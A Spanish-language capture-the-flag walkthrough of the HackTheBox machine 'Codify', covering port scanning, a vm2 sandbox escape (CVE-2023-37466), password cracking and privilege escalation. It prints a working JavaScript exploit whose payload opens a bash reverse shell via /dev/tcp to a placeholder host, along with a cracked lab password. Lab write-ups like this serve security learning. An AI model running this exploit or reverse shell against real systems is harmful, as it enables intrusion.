# Codify

![[[Pasted image 20231205144333.png](https://github.com/javiperlo/maquinas/blob/main/HackTheBox/Codify/images/Pasted%20image%2020231205144333.png) | 350]]

Write Up
--------

Codify es una máquina Linux donde explotaremos una vulnerabilidad en **vm2** (una biblioteca popular que se utiliza para ejecutar código no confiable en un entorno aislado en Node) 

Para comenzar, nos tenemos que asegurar de que la máquina está activa. Para ello mandamos una traza ICMP `ping -c 1 <IP>`, si está activa nos devolverá este mensaje &rarr; `1 packet emitted, 1 packet received` . La máquina está activa.

Una vez nos aseguramos de que la máquina está activa, pasamos a la fase de **reconocimiento**

#### Reconocimiento

Empezamos la fase de reconocmiento. Para ello hacemos uso de la herramienta **Nmap**, que nos permitirá reconocer los puertos que están abiertos. Existen 3 tipos de estados en cuanto a puertos.
1) Abierto (open)
2) Cerrado (closed)
3) Filtrado (filtered) &rarr; El puerto está protedigo por un firewall

Para enumerar los puertos abiertos, utilizaremos el siguiente comando:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oN allPorts
```

Esto hará que un escaneo de los 65535 puertos y nos devolverá en un archivo los puertos que están abiertos. 

En este caso, odemos observar estos puertos abiertos:

![[Pasted image 20231205145448.png | 900]]

Como podemos observar, tenemos 3 puertos abiertos. 
- 22 (ssh)
- 80 (http)
- 3000 (ppp)

Para obtener más información acerca de estos puertos, ejecutamos el siguiente comando:

```bash
nmap -sCV -p22,80,3000 <IP> -oN targeted
```

Ejecutando este comando, **nmap** ejecutará un conjunto de scripts donde nos proporcionará información sobre los servicios y versiones que corren por detrás de cada puerto. En este caso:

![[Pasted image 20231205150042.png | 800]]

#### Explotación

Si nos metemos en la web mediante la IP, nos sale lo siguiente:

![[Pasted image 20231205150259.png | 600]]

**¿Cómo podemos solucionar esto?**

Este error significa que la dirección IP asociada con ese dominio, no se está resolviendo correctamente. Para resolverlo, tenemos que añadir esa dirección al `/etc/hosts`

![[Pasted image 20231205150753.png]]

Esto hará que cuando pongamos la dirección IP en la url del navegador, se resolverá a la dirección de dominio **`codify.htb`**

Al guardar el archivo y refrescar la web:

![[Pasted image 20231205151222.png | 1000]]

Si nos vamos a la ventana de *About Us*: 
![[Pasted image 20231205151434.png | 1000]]

Podemos ver que en el editor, está implementada la librería **vm2**.

**¿Qué es vm2?**

> VM2 es un módulo en Node.js que permite ejecutar código JavaScript de forma aislada y segura en un entorno controlado. Esta biblioteca proporciona funcionalidades para crear instancias de máquinas virtuales en las cuales puedes ejecutar scripts de JavaScript sin afectar el entorno principal de la aplicación.

Esta librería, tiene una vulnerabilidad. La **[CVE-2023-37466](https://github.com/advisories/GHSA-cchq-frgv-rjh5)** 

Esta vulnerabilidad nos permite una ejecución remota de comandos.

Si en el editor, ejecutamos el siguiente exploit:

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"'); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));
```

Y nos ponemos en escucha con **netcat** en el puerto especificado:

![[Pasted image 20231205152257.png | 1000]]

Una vez hemos conseguido una **reverse shell**, seguiremos con el tratamiento de la TTY.

Mediante los siguiente comandos:

- **`script /dev/null -c bash`**
- **`Hacemos Ctrl + Z`**
- **`stty raw -echo; fg`**
- **`Escribimos: reset`**

Y una vez estemos de nuevo en la terminal:

- **`export TERM=xterm`**

Y ya tendríamos una consola en condiciones.

El usuario con el que estamos conectados es: **`svc`** 

Si nos vamos a la ruta **`/home`** vemos que hay un usuario **`joshua`** al cual no podemos acceder, por lo que tendremos que conseguir las credenciales de este usuario.

Vamos a donde está almacenada la web: **`/var/www/`** y aquí tenemos 3 carpetas. **`contact`**, **`editor`** y **`html`**

Nos metemos en la carpeta **`contact`** y hacemos un cat del archivo `tickets.db`

![[Pasted image 20231205170029.png |800]]

Como podemos comprobar, tenemos el usuario: `joshua` y la contraseña que es todo lo que sigue. La cual está hasheada.

Para poder dehashear la contraseña, utilizaremos **john the ripper**. 

![[Pasted image 20231205170214.png |600]]

La contraseña es: **spongebob1**

Con esas credenciales, tenemos dos opciones. O nos metemos mediante el SSH que hemos visto que está abierto, o desde la propia terminal que tenemos abierta, hace un **`su joshua`**
e introducir la contraseña. Yo he preferido quedarme en la terminal que tengo abierta, ya que he tratado la TTY por lo que es lo mismo.

Y haciendo **`ls`** encontramos la *flag* de **user** por lo que nos quedaría encontrar la flag de root.

#### Escalada de privilegios

El útlimo paso sería escalar privilegios en la máquina.

En primer lugar, podemos buscar los programas con permisos **SUID** que podamos ejecutar como usuario **`joshua`**.

Para encontramos esos archivos:

```bash
find / -perm -4000 2>/dev/null
```

De los programas que salen, no podemos utilizar ninguno ya que no tenemos permisos de ejecución.

Por lo que probamos con otro comando:

```bash
sudo -l
```

![[Pasted image 20231205171125.png |900]]

Vemos que tenemos ese archivo.

![[Pasted image 20231205171323.png]]

**Casualmente** en el direcotrio 'joshua' hay un script programado en python que ejecuta el programa **`mysql-backup.sh`**, el cual, al ejecutarlo, nos va a mostrar la contraseña de root.

![[Pasted image 20231205171621.png | 600]]

Por último:

![[Pasted image 20231205171744.png | 500]]

### Hasta aquí :)
